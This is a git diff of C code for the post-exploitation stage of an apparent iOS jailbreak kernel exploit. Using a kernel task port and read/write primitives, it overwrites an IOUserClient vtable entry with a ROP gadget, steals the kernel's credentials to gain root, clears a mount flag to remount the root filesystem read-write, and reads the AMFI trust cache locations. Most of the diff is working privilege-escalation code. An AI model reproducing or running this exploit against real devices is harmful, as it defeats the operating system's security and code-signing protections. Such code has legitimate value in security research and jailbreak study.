@@ -49,6 +49,12 @@ kern_return_t mach_vm_read_overwrite(vm_map_t target_task, mach_vm_address_t add
 
 mach_port_t tfpzero;
 
+int file_exist (char *filename)
+{
+	struct stat   buffer;
+	return (stat (filename, &buffer) == 0);
+}
+
 size_t kread(uint64_t where, void *p, size_t size)
 {
 	int rv;
@@ -74,7 +80,6 @@ void let_the_fun_begin(mach_port_t tfp0, mach_port_t user_client) {
 	tfpzero = tfp0;
 	
 	init_kernel(find_kernel_base(), NULL);
-//	fun_find_symbol(find_kernel_base(), "_csblob_get_cdhash");
 	
 	// Get the slide
 	uint64_t slide = find_kernel_base() - 0xFFFFFFF007004000;
@@ -124,6 +129,8 @@ void let_the_fun_begin(mach_port_t tfp0, mach_port_t user_client) {
 	// Replace IOUserClient::getExternalTrapForIndex with our ROP gadget (add x0, x0, #0x40; ret;)
 	wk64(fake_vtable+8*0xB7, find_add_x0_x0_0x40_ret());
 	
+	printf("Wrote the `add x0, x0, #0x40; ret;` gadget over getExternalTrapForIndex\n");
+	
 	
 	// Because the gadget gets the trap at user_client+0x40, we have to overwrite the contents of it
 	// We will pull a switch when doing so - retrieve the current contents, call the trap, put back the contents
@@ -143,17 +150,26 @@ do { \
 	uint32_t our_pid = getpid();
 	uint64_t our_proc = 0;
 	uint64_t kern_proc = 0;
+	uint64_t springboard_proc = 0;
 	
 	uint64_t proc = rk64(find_allproc());
 	while (proc) {
 		uint32_t pid = (uint32_t)rk32(proc + 0x10);
+		char name[40] = {0};
+		kread(proc+0x268, name, 20);
+//		printf("%s\n",name);
 		if (pid == our_pid) {
 			our_proc = proc;
 		} else if (pid == 0) {
 			kern_proc = proc;
+		} else if (!strcmp("SpringBoard", name)) {
+			springboard_proc = proc;
 		}
 		proc = rk64(proc);
 	}
+	
+	printf("our proc is at 0x%016llx\n", our_proc);
+	printf("kern proc is at 0x%016llx\n", kern_proc);
 	
 	// Give us some special flags
 	uint32_t csflags = rk32(our_proc + offsetof_p_csflags);
@@ -166,8 +182,8 @@ do { \
 	uint64_t self_ucred = 0;
 	KCALL(find_copyout(), our_proc+0x100, &self_ucred, sizeof(self_ucred), 0, 0, 0, 0);
 
-	KCALL(find_bcopy(), kern_ucred + 0x78, self_ucred + 0x78, sizeof(uint64_t), 0, 0, 0, 0);  // _bcopy offset
-	KCALL(find_bzero(), self_ucred + 0x18, 12, 0, 0, 0, 0, 0); // _bzero offset
+	KCALL(find_bcopy(), kern_ucred + 0x78, self_ucred + 0x78, sizeof(uint64_t), 0, 0, 0, 0);
+	KCALL(find_bzero(), self_ucred + 0x18, 12, 0, 0, 0, 0, 0);
 
 	setuid(0);
 	
@@ -180,6 +196,39 @@ do { \
 		printf("wrote test file: %p\n", f);
 	}
 	
+	// Remount / as rw - patch by xerub
+	{
+		vm_offset_t off = 0xd8;
+		uint64_t _rootvnode = find_rootvnode();
+		uint64_t rootfs_vnode = rk64(_rootvnode);
+		uint64_t v_mount = rk64(rootfs_vnode + off);
+		uint32_t v_flag = rk32(v_mount + 0x71);
+		
+		wk32(v_mount + 0x71, v_flag & ~(1 << 6));
+		
+		char *nmz = strdup("/dev/disk0s1s1");
+		int rv = mount("hfs", "/", MNT_UPDATE, (void *)&nmz);
+		printf("remounting: %d\n", rv);
+		
+		v_mount = rk64(rootfs_vnode + off);
+		wk32(v_mount + 0x71, v_flag);
+		
+		int fd = open("/.bit_of_fun", O_RDONLY);
+		if (fd == -1) {
+			fd = creat("/.bit_of_fun", 0644);
+		} else {
+			printf("File already exists!\n");
+		}
+		close(fd);
+	}
 	
+	printf("Did we mount / as read+write? %s\n", file_exist("/.bit_of_fun") ? "yes" : "no");
+	
+	printf("first four values of amficache: %08x\n", rk32(find_amficache()));
+	printf("trust cache at: %016llx\n", rk64(find_trustcache()));
+	
+	// Cleanup
+	
+	wk64(IOSurfaceRootUserClient_port + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT), IOSurfaceRootUserClient_addr);
 	
 }
